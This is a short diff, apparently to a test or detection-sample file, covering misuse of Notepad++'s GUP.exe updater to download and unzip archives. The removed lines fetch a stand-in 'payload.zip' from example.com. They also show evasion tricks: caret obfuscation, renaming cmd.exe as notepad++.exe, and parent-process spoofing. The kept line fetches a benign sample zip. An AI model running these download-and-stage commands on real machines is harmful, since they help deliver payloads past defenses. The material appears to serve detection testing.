@@ -1,6 +1,1 @@
-GUP.exe  -unzipTo "" "C:\Temp" "Sample https://getsamplefiles.com/download/zip/sample-2.zip CAC4D26F32CA629DFB10FE614ED00EB1066A0C0011386290D3426C3DE2E53AC6"
-"GUP.exe" -unzipTo=C:\Temp http://example.com/payload.zip
-cmd.exe /c "C:\Program Files\Notepad++\updater\GUP.exe -unzipTo C:\Temp h^t^t^p^:^/^/http://example.com/payload.zip"
-cmd.exe /c copy cmd.exe notepad++.exe && notepad++.exe /c "C:\Program Files\Notepad++\updater\GUP.exe -unzipTo C:\Temp http://example.com/payload.zip"
-copy cmd.exe notepad++.exe && notepad++.exe /c GUP.exe -unzipTo C:\Temp http://example.com/payload.zip
-Start-Process -FilePath "GUP.exe" -ArgumentList "-unzipTo C:\Temp http://example.com/payload.zip" -ParentProcessId (Get-Process notepad++ | Select-Object -First 1).Id
+GUP.exe -unzipTo "" "C:\Temp" "Sample https://getsamplefiles.com/download/zip/sample-2.zip CAC4D26F32CA629DFB10FE614ED00EB1066A0C0011386290D3426C3DE2E53AC6"
